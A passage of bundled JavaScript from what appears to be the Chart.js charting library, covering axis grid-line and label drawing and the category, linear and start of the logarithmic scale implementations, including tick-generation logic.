        ty1 = me.bottom - tl;
        ty2 = borderValue - axisHalfWidth;
        y1 = alignBorderValue(chartArea.top) + axisHalfWidth;
        y2 = chartArea.bottom;
      } else if (position === "bottom") {
        borderValue = alignBorderValue(me.top);
        y1 = chartArea.top;
        y2 = alignBorderValue(chartArea.bottom) - axisHalfWidth;
        ty1 = borderValue + axisHalfWidth;
        ty2 = me.top + tl;
      } else if (position === "left") {
        borderValue = alignBorderValue(me.right);
        tx1 = me.right - tl;
        tx2 = borderValue - axisHalfWidth;
        x1 = alignBorderValue(chartArea.left) + axisHalfWidth;
        x2 = chartArea.right;
      } else {
        borderValue = alignBorderValue(me.left);
        x1 = chartArea.left;
        x2 = alignBorderValue(chartArea.right) - axisHalfWidth;
        tx1 = borderValue + axisHalfWidth;
        tx2 = me.left + tl;
      }

      for (i = 0; i < ticksLength; ++i) {
        tick = ticks[i] || {};

        // autoskipper skipped this tick (#4635)
        if (isNullOrUndef(tick.label) && i < ticks.length) {
          continue;
        }

        if (i === me.zeroLineIndex && options.offset === offsetGridLines) {
          // Draw the first index specially
          lineWidth = gridLines.zeroLineWidth;
          lineColor = gridLines.zeroLineColor;
          borderDash = gridLines.zeroLineBorderDash || [];
          borderDashOffset = gridLines.zeroLineBorderDashOffset || 0.0;
        } else {
          lineWidth = valueAtIndexOrDefault(gridLines.lineWidth, i, 1);
          lineColor = valueAtIndexOrDefault(
            gridLines.color,
            i,
            "rgba(0,0,0,0.1)"
          );
          borderDash = gridLines.borderDash || [];
          borderDashOffset = gridLines.borderDashOffset || 0.0;
        }

        lineValue = getPixelForGridLine(me, tick._index || i, offsetGridLines);

        // Skip if the pixel is out of the range
        if (lineValue === undefined) {
          continue;
        }

        alignedLineValue = alignPixel(chart, lineValue, lineWidth);

        if (isHorizontal) {
          tx1 = tx2 = x1 = x2 = alignedLineValue;
        } else {
          ty1 = ty2 = y1 = y2 = alignedLineValue;
        }

        items.push({
          tx1: tx1,
          ty1: ty1,
          tx2: tx2,
          ty2: ty2,
          x1: x1,
          y1: y1,
          x2: x2,
          y2: y2,
          width: lineWidth,
          color: lineColor,
          borderDash: borderDash,
          borderDashOffset: borderDashOffset,
        });
      }

      items.ticksLength = ticksLength;
      items.borderValue = borderValue;

      return items;
    },

    /**
     * @private
     */
    _computeLabelItems: function () {
      var me = this;
      var options = me.options;
      var optionTicks = options.ticks;
      var position = options.position;
      var isMirrored = optionTicks.mirror;
      var isHorizontal = me.isHorizontal();
      var ticks = me._ticksToDraw;
      var fonts = parseTickFontOptions(optionTicks);
      var tickPadding = optionTicks.padding;
      var tl = getTickMarkLength(options.gridLines);
      var rotation = -helpers$1.toRadians(me.labelRotation);
      var items = [];
      var i,
        ilen,
        tick,
        label,
        x,
        y,
        textAlign,
        pixel,
        font,
        lineHeight,
        lineCount,
        textOffset;

      if (position === "top") {
        y = me.bottom - tl - tickPadding;
        textAlign = !rotation ? "center" : "left";
      } else if (position === "bottom") {
        y = me.top + tl + tickPadding;
        textAlign = !rotation ? "center" : "right";
      } else if (position === "left") {
        x = me.right - (isMirrored ? 0 : tl) - tickPadding;
        textAlign = isMirrored ? "left" : "right";
      } else {
        x = me.left + (isMirrored ? 0 : tl) + tickPadding;
        textAlign = isMirrored ? "right" : "left";
      }

      for (i = 0, ilen = ticks.length; i < ilen; ++i) {
        tick = ticks[i];
        label = tick.label;

        // autoskipper skipped this tick (#4635)
        if (isNullOrUndef(label)) {
          continue;
        }

        pixel = me.getPixelForTick(tick._index || i) + optionTicks.labelOffset;
        font = tick.major ? fonts.major : fonts.minor;
        lineHeight = font.lineHeight;
        lineCount = isArray(label) ? label.length : 1;

        if (isHorizontal) {
          x = pixel;
          textOffset =
            position === "top"
              ? ((!rotation ? 0.5 : 1) - lineCount) * lineHeight
              : (!rotation ? 0.5 : 0) * lineHeight;
        } else {
          y = pixel;
          textOffset = ((1 - lineCount) * lineHeight) / 2;
        }

        items.push({
          x: x,
          y: y,
          rotation: rotation,
          label: label,
          font: font,
          textOffset: textOffset,
          textAlign: textAlign,
        });
      }

      return items;
    },

    /**
     * @private
     */
    _drawGrid: function (chartArea) {
      var me = this;
      var gridLines = me.options.gridLines;

      if (!gridLines.display) {
        return;
      }

      var ctx = me.ctx;
      var chart = me.chart;
      var alignPixel = helpers$1._alignPixel;
      var axisWidth = gridLines.drawBorder
        ? valueAtIndexOrDefault(gridLines.lineWidth, 0, 0)
        : 0;
      var items =
        me._gridLineItems ||
        (me._gridLineItems = me._computeGridLineItems(chartArea));
      var width, color, i, ilen, item;

      for (i = 0, ilen = items.length; i < ilen; ++i) {
        item = items[i];
        width = item.width;
        color = item.color;

        if (width && color) {
          ctx.save();
          ctx.lineWidth = width;
          ctx.strokeStyle = color;
          if (ctx.setLineDash) {
            ctx.setLineDash(item.borderDash);
            ctx.lineDashOffset = item.borderDashOffset;
          }

          ctx.beginPath();

          if (gridLines.drawTicks) {
            ctx.moveTo(item.tx1, item.ty1);
            ctx.lineTo(item.tx2, item.ty2);
          }

          if (gridLines.drawOnChartArea) {
            ctx.moveTo(item.x1, item.y1);
            ctx.lineTo(item.x2, item.y2);
          }

          ctx.stroke();
          ctx.restore();
        }
      }

      if (axisWidth) {
        // Draw the line at the edge of the axis
        var firstLineWidth = axisWidth;
        var lastLineWidth = valueAtIndexOrDefault(
          gridLines.lineWidth,
          items.ticksLength - 1,
          1
        );
        var borderValue = items.borderValue;
        var x1, x2, y1, y2;

        if (me.isHorizontal()) {
          x1 = alignPixel(chart, me.left, firstLineWidth) - firstLineWidth / 2;
          x2 = alignPixel(chart, me.right, lastLineWidth) + lastLineWidth / 2;
          y1 = y2 = borderValue;
        } else {
          y1 = alignPixel(chart, me.top, firstLineWidth) - firstLineWidth / 2;
          y2 = alignPixel(chart, me.bottom, lastLineWidth) + lastLineWidth / 2;
          x1 = x2 = borderValue;
        }

        ctx.lineWidth = axisWidth;
        ctx.strokeStyle = valueAtIndexOrDefault(gridLines.color, 0);
        ctx.beginPath();
        ctx.moveTo(x1, y1);
        ctx.lineTo(x2, y2);
        ctx.stroke();
      }
    },

    /**
     * @private
     */
    _drawLabels: function () {
      var me = this;
      var optionTicks = me.options.ticks;

      if (!optionTicks.display) {
        return;
      }

      var ctx = me.ctx;
      var items = me._labelItems || (me._labelItems = me._computeLabelItems());
      var i, j, ilen, jlen, item, tickFont, label, y;

      for (i = 0, ilen = items.length; i < ilen; ++i) {
        item = items[i];
        tickFont = item.font;

        // Make sure we draw text in the correct color and font
        ctx.save();
        ctx.translate(item.x, item.y);
        ctx.rotate(item.rotation);
        ctx.font = tickFont.string;
        ctx.fillStyle = tickFont.color;
        ctx.textBaseline = "middle";
        ctx.textAlign = item.textAlign;

        label = item.label;
        y = item.textOffset;
        if (isArray(label)) {
          for (j = 0, jlen = label.length; j < jlen; ++j) {
            // We just make sure the multiline element is a string here..
            ctx.fillText("" + label[j], 0, y);
            y += tickFont.lineHeight;
          }
        } else {
          ctx.fillText(label, 0, y);
        }
        ctx.restore();
      }
    },

    /**
     * @private
     */
    _drawTitle: function () {
      var me = this;
      var ctx = me.ctx;
      var options = me.options;
      var scaleLabel = options.scaleLabel;

      if (!scaleLabel.display) {
        return;
      }

      var scaleLabelFontColor = valueOrDefault$a(
        scaleLabel.fontColor,
        core_defaults.global.defaultFontColor
      );
      var scaleLabelFont = helpers$1.options._parseFont(scaleLabel);
      var scaleLabelPadding = helpers$1.options.toPadding(scaleLabel.padding);
      var halfLineHeight = scaleLabelFont.lineHeight / 2;
      var position = options.position;
      var rotation = 0;
      var scaleLabelX, scaleLabelY;

      if (me.isHorizontal()) {
        scaleLabelX = me.left + me.width / 2; // midpoint of the width
        scaleLabelY =
          position === "bottom"
            ? me.bottom - halfLineHeight - scaleLabelPadding.bottom
            : me.top + halfLineHeight + scaleLabelPadding.top;
      } else {
        var isLeft = position === "left";
        scaleLabelX = isLeft
          ? me.left + halfLineHeight + scaleLabelPadding.top
          : me.right - halfLineHeight - scaleLabelPadding.top;
        scaleLabelY = me.top + me.height / 2;
        rotation = isLeft ? -0.5 * Math.PI : 0.5 * Math.PI;
      }

      ctx.save();
      ctx.translate(scaleLabelX, scaleLabelY);
      ctx.rotate(rotation);
      ctx.textAlign = "center";
      ctx.textBaseline = "middle";
      ctx.fillStyle = scaleLabelFontColor; // render in correct colour
      ctx.font = scaleLabelFont.string;
      ctx.fillText(scaleLabel.labelString, 0, 0);
      ctx.restore();
    },

    draw: function (chartArea) {
      var me = this;

      if (!me._isVisible()) {
        return;
      }

      me._drawGrid(chartArea);
      me._drawTitle();
      me._drawLabels();
    },

    /**
     * @private
     */
    _layers: function () {
      var me = this;
      var opts = me.options;
      var tz = (opts.ticks && opts.ticks.z) || 0;
      var gz = (opts.gridLines && opts.gridLines.z) || 0;

      if (!me._isVisible() || tz === gz || me.draw !== me._draw) {
        // backward compatibility: draw has been overridden by custom scale
        return [
          {
            z: tz,
            draw: function () {
              me.draw.apply(me, arguments);
            },
          },
        ];
      }

      return [
        {
          z: gz,
          draw: function () {
            me._drawGrid.apply(me, arguments);
            me._drawTitle.apply(me, arguments);
          },
        },
        {
          z: tz,
          draw: function () {
            me._drawLabels.apply(me, arguments);
          },
        },
      ];
    },

    /**
     * @private
     */
    _getMatchingVisibleMetas: function (type) {
      var me = this;
      var isHorizontal = me.isHorizontal();
      return me.chart._getSortedVisibleDatasetMetas().filter(function (meta) {
        return (
          (!type || meta.type === type) &&
          (isHorizontal ? meta.xAxisID === me.id : meta.yAxisID === me.id)
        );
      });
    },
  });

  Scale.prototype._draw = Scale.prototype.draw;

  var core_scale = Scale;

  var isNullOrUndef$1 = helpers$1.isNullOrUndef;

  var defaultConfig = {
    position: "bottom",
  };

  var scale_category = core_scale.extend({
    determineDataLimits: function () {
      var me = this;
      var labels = me._getLabels();
      var ticksOpts = me.options.ticks;
      var min = ticksOpts.min;
      var max = ticksOpts.max;
      var minIndex = 0;
      var maxIndex = labels.length - 1;
      var findIndex;

      if (min !== undefined) {
        // user specified min value
        findIndex = labels.indexOf(min);
        if (findIndex >= 0) {
          minIndex = findIndex;
        }
      }

      if (max !== undefined) {
        // user specified max value
        findIndex = labels.indexOf(max);
        if (findIndex >= 0) {
          maxIndex = findIndex;
        }
      }

      me.minIndex = minIndex;
      me.maxIndex = maxIndex;
      me.min = labels[minIndex];
      me.max = labels[maxIndex];
    },

    buildTicks: function () {
      var me = this;
      var labels = me._getLabels();
      var minIndex = me.minIndex;
      var maxIndex = me.maxIndex;

      // If we are viewing some subset of labels, slice the original array
      me.ticks =
        minIndex === 0 && maxIndex === labels.length - 1
          ? labels
          : labels.slice(minIndex, maxIndex + 1);
    },

    getLabelForIndex: function (index, datasetIndex) {
      var me = this;
      var chart = me.chart;

      if (
        chart.getDatasetMeta(datasetIndex).controller._getValueScaleId() ===
        me.id
      ) {
        return me.getRightValue(chart.data.datasets[datasetIndex].data[index]);
      }

      return me._getLabels()[index];
    },

    _configure: function () {
      var me = this;
      var offset = me.options.offset;
      var ticks = me.ticks;

      core_scale.prototype._configure.call(me);

      if (!me.isHorizontal()) {
        // For backward compatibility, vertical category scale reverse is inverted.
        me._reversePixels = !me._reversePixels;
      }

      if (!ticks) {
        return;
      }

      me._startValue = me.minIndex - (offset ? 0.5 : 0);
      me._valueRange = Math.max(ticks.length - (offset ? 0 : 1), 1);
    },

    // Used to get data value locations.  Value can either be an index or a numerical value
    getPixelForValue: function (value, index, datasetIndex) {
      var me = this;
      var valueCategory, labels, idx;

      if (!isNullOrUndef$1(index) && !isNullOrUndef$1(datasetIndex)) {
        value = me.chart.data.datasets[datasetIndex].data[index];
      }

      // If value is a data object, then index is the index in the data array,
      // not the index of the scale. We need to change that.
      if (!isNullOrUndef$1(value)) {
        valueCategory = me.isHorizontal() ? value.x : value.y;
      }
      if (
        valueCategory !== undefined ||
        (value !== undefined && isNaN(index))
      ) {
        labels = me._getLabels();
        value = helpers$1.valueOrDefault(valueCategory, value);
        idx = labels.indexOf(value);
        index = idx !== -1 ? idx : index;
        if (isNaN(index)) {
          index = value;
        }
      }
      return me.getPixelForDecimal((index - me._startValue) / me._valueRange);
    },

    getPixelForTick: function (index) {
      var ticks = this.ticks;
      return index < 0 || index > ticks.length - 1
        ? null
        : this.getPixelForValue(ticks[index], index + this.minIndex);
    },

    getValueForPixel: function (pixel) {
      var me = this;
      var value = Math.round(
        me._startValue + me.getDecimalForPixel(pixel) * me._valueRange
      );
      return Math.min(Math.max(value, 0), me.ticks.length - 1);
    },

    getBasePixel: function () {
      return this.bottom;
    },
  });

  // INTERNAL: static default options, registered in src/index.js
  var _defaults = defaultConfig;
  scale_category._defaults = _defaults;

  var noop = helpers$1.noop;
  var isNullOrUndef$2 = helpers$1.isNullOrUndef;

  /**
   * Generate a set of linear ticks
   * @param generationOptions the options used to generate the ticks
   * @param dataRange the range of the data
   * @returns {number[]} array of tick values
   */
  function generateTicks(generationOptions, dataRange) {
    var ticks = [];
    // To get a "nice" value for the tick spacing, we will use the appropriately named
    // "nice number" algorithm. See https://stackoverflow.com/questions/8506881/nice-label-algorithm-for-charts-with-minimum-ticks
    // for details.

    var MIN_SPACING = 1e-14;
    var stepSize = generationOptions.stepSize;
    var unit = stepSize || 1;
    var maxNumSpaces = generationOptions.maxTicks - 1;
    var min = generationOptions.min;
    var max = generationOptions.max;
    var precision = generationOptions.precision;
    var rmin = dataRange.min;
    var rmax = dataRange.max;
    var spacing = helpers$1.niceNum((rmax - rmin) / maxNumSpaces / unit) * unit;
    var factor, niceMin, niceMax, numSpaces;

    // Beyond MIN_SPACING floating point numbers being to lose precision
    // such that we can't do the math necessary to generate ticks
    if (spacing < MIN_SPACING && isNullOrUndef$2(min) && isNullOrUndef$2(max)) {
      return [rmin, rmax];
    }

    numSpaces = Math.ceil(rmax / spacing) - Math.floor(rmin / spacing);
    if (numSpaces > maxNumSpaces) {
      // If the calculated num of spaces exceeds maxNumSpaces, recalculate it
      spacing =
        helpers$1.niceNum((numSpaces * spacing) / maxNumSpaces / unit) * unit;
    }

    if (stepSize || isNullOrUndef$2(precision)) {
      // If a precision is not specified, calculate factor based on spacing
      factor = Math.pow(10, helpers$1._decimalPlaces(spacing));
    } else {
      // If the user specified a precision, round to that number of decimal places
      factor = Math.pow(10, precision);
      spacing = Math.ceil(spacing * factor) / factor;
    }

    niceMin = Math.floor(rmin / spacing) * spacing;
    niceMax = Math.ceil(rmax / spacing) * spacing;

    // If min, max and stepSize is set and they make an evenly spaced scale use it.
    if (stepSize) {
      // If very close to our whole number, use it.
      if (
        !isNullOrUndef$2(min) &&
        helpers$1.almostWhole(min / spacing, spacing / 1000)
      ) {
        niceMin = min;
      }
      if (
        !isNullOrUndef$2(max) &&
        helpers$1.almostWhole(max / spacing, spacing / 1000)
      ) {
        niceMax = max;
      }
    }

    numSpaces = (niceMax - niceMin) / spacing;
    // If very close to our rounded value, use it.
    if (
      helpers$1.almostEquals(numSpaces, Math.round(numSpaces), spacing / 1000)
    ) {
      numSpaces = Math.round(numSpaces);
    } else {
      numSpaces = Math.ceil(numSpaces);
    }

    niceMin = Math.round(niceMin * factor) / factor;
    niceMax = Math.round(niceMax * factor) / factor;
    ticks.push(isNullOrUndef$2(min) ? niceMin : min);
    for (var j = 1; j < numSpaces; ++j) {
      ticks.push(Math.round((niceMin + j * spacing) * factor) / factor);
    }
    ticks.push(isNullOrUndef$2(max) ? niceMax : max);

    return ticks;
  }

  var scale_linearbase = core_scale.extend({
    getRightValue: function (value) {
      if (typeof value === "string") {
        return +value;
      }
      return core_scale.prototype.getRightValue.call(this, value);
    },

    handleTickRangeOptions: function () {
      var me = this;
      var opts = me.options;
      var tickOpts = opts.ticks;

      // If we are forcing it to begin at 0, but 0 will already be rendered on the chart,
      // do nothing since that would make the chart weird. If the user really wants a weird chart
      // axis, they can manually override it
      if (tickOpts.beginAtZero) {
        var minSign = helpers$1.sign(me.min);
        var maxSign = helpers$1.sign(me.max);

        if (minSign < 0 && maxSign < 0) {
          // move the top up to 0
          me.max = 0;
        } else if (minSign > 0 && maxSign > 0) {
          // move the bottom down to 0
          me.min = 0;
        }
      }

      var setMin =
        tickOpts.min !== undefined || tickOpts.suggestedMin !== undefined;
      var setMax =
        tickOpts.max !== undefined || tickOpts.suggestedMax !== undefined;

      if (tickOpts.min !== undefined) {
        me.min = tickOpts.min;
      } else if (tickOpts.suggestedMin !== undefined) {
        if (me.min === null) {
          me.min = tickOpts.suggestedMin;
        } else {
          me.min = Math.min(me.min, tickOpts.suggestedMin);
        }
      }

      if (tickOpts.max !== undefined) {
        me.max = tickOpts.max;
      } else if (tickOpts.suggestedMax !== undefined) {
        if (me.max === null) {
          me.max = tickOpts.suggestedMax;
        } else {
          me.max = Math.max(me.max, tickOpts.suggestedMax);
        }
      }

      if (setMin !== setMax) {
        // We set the min or the max but not both.
        // So ensure that our range is good
        // Inverted or 0 length range can happen when
        // ticks.min is set, and no datasets are visible
        if (me.min >= me.max) {
          if (setMin) {
            me.max = me.min + 1;
          } else {
            me.min = me.max - 1;
          }
        }
      }

      if (me.min === me.max) {
        me.max++;

        if (!tickOpts.beginAtZero) {
          me.min--;
        }
      }
    },

    getTickLimit: function () {
      var me = this;
      var tickOpts = me.options.ticks;
      var stepSize = tickOpts.stepSize;
      var maxTicksLimit = tickOpts.maxTicksLimit;
      var maxTicks;

      if (stepSize) {
        maxTicks =
          Math.ceil(me.max / stepSize) - Math.floor(me.min / stepSize) + 1;
      } else {
        maxTicks = me._computeTickLimit();
        maxTicksLimit = maxTicksLimit || 11;
      }

      if (maxTicksLimit) {
        maxTicks = Math.min(maxTicksLimit, maxTicks);
      }

      return maxTicks;
    },

    _computeTickLimit: function () {
      return Number.POSITIVE_INFINITY;
    },

    handleDirectionalChanges: noop,

    buildTicks: function () {
      var me = this;
      var opts = me.options;
      var tickOpts = opts.ticks;

      // Figure out what the max number of ticks we can support it is based on the size of
      // the axis area. For now, we say that the minimum tick spacing in pixels must be 40
      // We also limit the maximum number of ticks to 11 which gives a nice 10 squares on
      // the graph. Make sure we always have at least 2 ticks
      var maxTicks = me.getTickLimit();
      maxTicks = Math.max(2, maxTicks);

      var numericGeneratorOptions = {
        maxTicks: maxTicks,
        min: tickOpts.min,
        max: tickOpts.max,
        precision: tickOpts.precision,
        stepSize: helpers$1.valueOrDefault(
          tickOpts.fixedStepSize,
          tickOpts.stepSize
        ),
      };
      var ticks = (me.ticks = generateTicks(numericGeneratorOptions, me));

      me.handleDirectionalChanges();

      // At this point, we need to update our max and min given the tick values since we have expanded the
      // range of the scale
      me.max = helpers$1.max(ticks);
      me.min = helpers$1.min(ticks);

      if (tickOpts.reverse) {
        ticks.reverse();

        me.start = me.max;
        me.end = me.min;
      } else {
        me.start = me.min;
        me.end = me.max;
      }
    },

    convertTicksToLabels: function () {
      var me = this;
      me.ticksAsNumbers = me.ticks.slice();
      me.zeroLineIndex = me.ticks.indexOf(0);

      core_scale.prototype.convertTicksToLabels.call(me);
    },

    _configure: function () {
      var me = this;
      var ticks = me.getTicks();
      var start = me.min;
      var end = me.max;
      var offset;

      core_scale.prototype._configure.call(me);

      if (me.options.offset && ticks.length) {
        offset = (end - start) / Math.max(ticks.length - 1, 1) / 2;
        start -= offset;
        end += offset;
      }
      me._startValue = start;
      me._endValue = end;
      me._valueRange = end - start;
    },
  });

  var defaultConfig$1 = {
    position: "left",
    ticks: {
      callback: core_ticks.formatters.linear,
    },
  };

  var DEFAULT_MIN = 0;
  var DEFAULT_MAX = 1;

  function getOrCreateStack(stacks, stacked, meta) {
    var key = [
      meta.type,
      // we have a separate stack for stack=undefined datasets when the opts.stacked is undefined
      stacked === undefined && meta.stack === undefined ? meta.index : "",
      meta.stack,
    ].join(".");

    if (stacks[key] === undefined) {
      stacks[key] = {
        pos: [],
        neg: [],
      };
    }

    return stacks[key];
  }

  function stackData(scale, stacks, meta, data) {
    var opts = scale.options;
    var stacked = opts.stacked;
    var stack = getOrCreateStack(stacks, stacked, meta);
    var pos = stack.pos;
    var neg = stack.neg;
    var ilen = data.length;
    var i, value;

    for (i = 0; i < ilen; ++i) {
      value = scale._parseValue(data[i]);
      if (isNaN(value.min) || isNaN(value.max) || meta.data[i].hidden) {
        continue;
      }

      pos[i] = pos[i] || 0;
      neg[i] = neg[i] || 0;

      if (opts.relativePoints) {
        pos[i] = 100;
      } else if (value.min < 0 || value.max < 0) {
        neg[i] += value.min;
      } else {
        pos[i] += value.max;
      }
    }
  }

  function updateMinMax(scale, meta, data) {
    var ilen = data.length;
    var i, value;

    for (i = 0; i < ilen; ++i) {
      value = scale._parseValue(data[i]);
      if (isNaN(value.min) || isNaN(value.max) || meta.data[i].hidden) {
        continue;
      }

      scale.min = Math.min(scale.min, value.min);
      scale.max = Math.max(scale.max, value.max);
    }
  }

  var scale_linear = scale_linearbase.extend({
    determineDataLimits: function () {
      var me = this;
      var opts = me.options;
      var chart = me.chart;
      var datasets = chart.data.datasets;
      var metasets = me._getMatchingVisibleMetas();
      var hasStacks = opts.stacked;
      var stacks = {};
      var ilen = metasets.length;
      var i, meta, data, values;

      me.min = Number.POSITIVE_INFINITY;
      me.max = Number.NEGATIVE_INFINITY;

      if (hasStacks === undefined) {
        for (i = 0; !hasStacks && i < ilen; ++i) {
          meta = metasets[i];
          hasStacks = meta.stack !== undefined;
        }
      }

      for (i = 0; i < ilen; ++i) {
        meta = metasets[i];
        data = datasets[meta.index].data;
        if (hasStacks) {
          stackData(me, stacks, meta, data);
        } else {
          updateMinMax(me, meta, data);
        }
      }

      helpers$1.each(stacks, function (stackValues) {
        values = stackValues.pos.concat(stackValues.neg);
        me.min = Math.min(me.min, helpers$1.min(values));
        me.max = Math.max(me.max, helpers$1.max(values));
      });

      me.min =
        helpers$1.isFinite(me.min) && !isNaN(me.min) ? me.min : DEFAULT_MIN;
      me.max =
        helpers$1.isFinite(me.max) && !isNaN(me.max) ? me.max : DEFAULT_MAX;

      // Common base implementation to handle ticks.min, ticks.max, ticks.beginAtZero
      me.handleTickRangeOptions();
    },

    // Returns the maximum number of ticks based on the scale dimension
    _computeTickLimit: function () {
      var me = this;
      var tickFont;

      if (me.isHorizontal()) {
        return Math.ceil(me.width / 40);
      }
      tickFont = helpers$1.options._parseFont(me.options.ticks);
      return Math.ceil(me.height / tickFont.lineHeight);
    },

    // Called after the ticks are built. We need
    handleDirectionalChanges: function () {
      if (!this.isHorizontal()) {
        // We are in a vertical orientation. The top value is the highest. So reverse the array
        this.ticks.reverse();
      }
    },

    getLabelForIndex: function (index, datasetIndex) {
      return this._getScaleLabel(
        this.chart.data.datasets[datasetIndex].data[index]
      );
    },

    // Utils
    getPixelForValue: function (value) {
      var me = this;
      return me.getPixelForDecimal(
        (+me.getRightValue(value) - me._startValue) / me._valueRange
      );
    },

    getValueForPixel: function (pixel) {
      return (
        this._startValue + this.getDecimalForPixel(pixel) * this._valueRange
      );
    },

    getPixelForTick: function (index) {
      var ticks = this.ticksAsNumbers;
      if (index < 0 || index > ticks.length - 1) {
        return null;
      }
      return this.getPixelForValue(ticks[index]);
    },
  });

  // INTERNAL: static default options, registered in src/index.js
  var _defaults$1 = defaultConfig$1;
  scale_linear._defaults = _defaults$1;

  var valueOrDefault$b = helpers$1.valueOrDefault;
  var log10 = helpers$1.math.log10;

  /**
   * Generate a set of logarithmic ticks
   * @param generationOptions the options used to generate the ticks
   * @param dataRange the range of the data
   * @returns {number[]} array of tick values
   */
  function generateTicks$1(generationOptions, dataRange) {
    var ticks = [];

    var tickVal = valueOrDefault$b(
      generationOptions.min,
      Math.pow(10, Math.floor(log10(dataRange.min)))
    );

    var endExp = Math.floor(log10(dataRange.max));
    var endSignificand = Math.ceil(dataRange.max / Math.pow(10, endExp));
    var exp, significand;

    if (tickVal === 0) {
      exp = Math.floor(log10(dataRange.minNotZero));
      significand = Math.floor(dataRange.minNotZero / Math.pow(10, exp));

      ticks.push(tickVal);
      tickVal = significand * Math.pow(10, exp);
    } else {
      exp = Math.floor(log10(tickVal));
      significand = Math.floor(tickVal / Math.pow(10, exp));
    }
    var precision = exp < 0 ? Math.pow(10, Math.abs(exp)) : 1;

    do {
      ticks.push(tickVal);

      ++significand;
      if (significand === 10) {
        significand = 1;
        ++exp;
        precision = exp >= 0 ? 1 : precision;
      }

      tickVal =
        Math.round(significand * Math.pow(10, exp) * precision) / precision;
    } while (exp < endExp || (exp === endExp && significand < endSignificand));

    var lastTick = valueOrDefault$b(generationOptions.max, tickVal);
    ticks.push(lastTick);

    return ticks;
  }

  var defaultConfig$2 = {
    position: "left",

    // label settings
    ticks: {
      callback: core_ticks.formatters.logarithmic,
    },
  };

  // TODO(v3): change this to positiveOrDefault
  function nonNegativeOrDefault(value, defaultValue) {
    return helpers$1.isFinite(value) && value >= 0 ? value : defaultValue;
  }

  var scale_logarithmic = core_scale.extend({
    determineDataLimits: function () {
      var me = this;
      var opts = me.options;
      var chart = me.chart;
      var datasets = chart.data.datasets;
      var isHorizontal = me.isHorizontal();
      function IDMatches(meta) {
        return isHorizontal ? meta.xAxisID === me.id : meta.yAxisID === me.id;
      }
      var datasetIndex, meta, value, data, i, ilen;

      // Calculate Range
      me.min = Number.POSITIVE_INFINITY;
      me.max = Number.NEGATIVE_INFINITY;
      me.minNotZero = Number.POSITIVE_INFINITY;

      var hasStacks = opts.stacked;
      if (hasStacks === undefined) {
        for (datasetIndex = 0; datasetIndex < datasets.length; datasetIndex++) {
          meta = chart.getDatasetMeta(datasetIndex);
          if (
            chart.isDatasetVisible(datasetIndex) &&
            IDMatches(meta) &&
            meta.stack !== undefined
          ) {
            hasStacks = true;
            break;
          }
        }
      }

      if (opts.stacked || hasStacks) {
        var valuesPerStack = {};

        for (datasetIndex = 0; datasetIndex < datasets.length; datasetIndex++) {
          meta = chart.getDatasetMeta(datasetIndex);
          var key = [
            meta.type,
            // we have a separate stack for stack=undefined datasets when the opts.stacked is undefined
            opts.stacked === undefined && meta.stack === undefined
              ? datasetIndex
              : "",
            meta.stack,
          ].join(".");

          if (chart.isDatasetVisible(datasetIndex) && IDMatches(meta)) {
            if (valuesPerStack[key] === undefined) {
              valuesPerStack[key] = [];
            }

            data = datasets[datasetIndex].data;
            for (i = 0, ilen = data.length; i < ilen; i++) {
              var values = valuesPerStack[key];
              value = me._parseValue(data[i]);
              // invalid, hidden and negative values are ignored
              if (
                isNaN(value.min) ||
                isNaN(value.max) ||
                meta.data[i].hidden ||
                value.min < 0 ||
                value.max < 0
              ) {
                continue;
              }
              values[i] = values[i] || 0;
              values[i] += value.max;
            }
          }
        }

        helpers$1.each(valuesPerStack, function (valuesForType) {
          if (valuesForType.length > 0) {
            var minVal = helpers$1.min(valuesForType);
            var maxVal = helpers$1.max(valuesForType);
            me.min = Math.min(me.min, minVal);
            me.max = Math.max(me.max, maxVal);
          }
        });
      } else {
        for (datasetIndex = 0; datasetIndex < datasets.length; datasetIndex++) {
          meta = chart.getDatasetMeta(datasetIndex);
          if (chart.isDatasetVisible(datasetIndex) && IDMatches(meta)) {
            data = datasets[datasetIndex].data;
            for (i = 0, ilen = data.length; i < ilen; i++) {
              value = me._parseValue(data[i]);
              // invalid, hidden and negative values are ignored
              if (
                isNaN(value.min) ||
                isNaN(value.max) ||
                meta.data[i].hidden ||
                value.min < 0 ||
                value.max < 0
              ) {
                continue;
              }

              me.min = Math.min(value.min, me.min);
              me.max = Math.max(value.max, me.max);

              if (value.min !== 0) {
                me.minNotZero = Math.min(value.min, me.minNotZero);
              }
            }
          }
        }
      }

      me.min = helpers$1.isFinite(me.min) ? me.min : null;
      me.max = helpers$1.isFinite(me.max) ? me.max : null;
      me.minNotZero = helpers$1.isFinite(me.minNotZero) ? me.minNotZero : null;

      // Common base implementation to handle ticks.min, ticks.max
      this.handleTickRangeOptions();
    },

    handleTickRangeOptions: function () {
      var me = this;
      var tickOpts = me.options.ticks;
      var DEFAULT_MIN = 1;
      var DEFAULT_MAX = 10;

      me.min = nonNegativeOrDefault(tickOpts.min, me.min);
      me.max = nonNegativeOrDefault(tickOpts.max, me.max);

      if (me.min === me.max) {
        if (me.min !== 0 && me.min !== null) {
          me.min = Math.pow(10, Math.floor(log10(me.min)) - 1);
          me.max = Math.pow(10, Math.floor(log10(me.max)) + 1);
        } else {
          me.min = DEFAULT_MIN;
          me.max = DEFAULT_MAX;
        }
      }
      if (me.min === null) {
        me.min = Math.pow(10, Math.floor(log10(me.max)) - 1);
      }
      if (me.max === null) {
        me.max =
          me.min !== 0
            ? Math.pow(10, Math.floor(log10(me.min)) + 1)
            : DEFAULT_MAX;
      }
      if (me.minNotZero === null) {
        if (me.min > 0) {
          me.minNotZero = me.min;
        } else if (me.max < 1) {
          me.minNotZero = Math.pow(10, Math.floor(log10(me.max)));
        } else {
          me.minNotZero = DEFAULT_MIN;
        }
      }
    },

    buildTicks: function () {
      var me = this;
      var tickOpts = me.options.ticks;
      var reverse = !me.isHorizontal();

      var generationOptions = {
        min: nonNegativeOrDefault(tickOpts.min),
        max: nonNegativeOrDefault(tickOpts.max),
      };
      var ticks = (me.ticks = generateTicks$1(generationOptions, me));

      // At this point, we need to update our max and min given the tick values since we have expanded the
      // range of the scale
      me.max = helpers$1.max(ticks);
      me.min = helpers$1.min(ticks);

      if (tickOpts.reverse) {
        reverse = !reverse;
        me.start = me.max;
        me.end = me.min;
      } else {
        me.start = me.min;
        me.end = me.max;
      }
      if (reverse) {
        ticks.reverse();
      }
    },

    convertTicksToLabels: function () {
      this.tickValues = this.ticks.slice();

      core_scale.prototype.convertTicksToLabels.call(this);
    },

    // Get the correct tooltip label
    getLabelForIndex: function (index, datasetIndex) {
      return this._getScaleLabel(
        this.chart.data.datasets[datasetIndex].data[index]
      );
    },

